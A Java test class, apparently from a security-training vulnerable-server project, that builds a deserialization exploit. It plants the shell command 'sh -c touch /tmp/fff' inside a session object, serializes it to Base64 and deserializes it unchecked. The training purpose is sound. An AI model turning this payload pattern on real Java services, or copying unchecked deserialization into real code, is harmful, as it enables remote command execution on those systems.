package com.sectraining.vulnserver.decereal;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class SerializationTest {

	public static void main(String[] args) throws InstantiationException, IllegalAccessException, NoSuchFieldException, SecurityException, IOException, ClassNotFoundException {
		// TODO Auto-generated method stub
		Class<?> clazz = BenignSession.class;
		Object obj = clazz.newInstance();
		
		((BenignSession)obj).name = "bob";
		((BenignSession)obj).dollars = 200;
		
		Class<?> dangClass = Dangerous.class;
		Object dangObj = dangClass.newInstance();
		
		Field field = dangObj.getClass().getDeclaredField("stuff");
		field.setAccessible(true);
		ArrayList<String> commandList = new ArrayList<String>();
		commandList.add("sh");
		commandList.add("-c");
		commandList.add("touch /tmp/fff");
		
		field.set(dangObj, commandList);
		
		((BenignSession)obj).placeholder = dangObj;
		
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);

        oos.writeObject(obj);
        oos.close();


        byte[] bytes = bos.toByteArray();

        String serialized = Base64.getEncoder().encodeToString(bytes);
        
        System.out.println(serialized);
        bytes = Base64.getMimeDecoder().decode(serialized);
        

        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);

        bis.close();
        ObjectInputStream ois = new ObjectInputStream(bis);
        BenignSession dessess = (BenignSession)ois.readObject();
        System.out.println(dessess.name);
		
	}

}
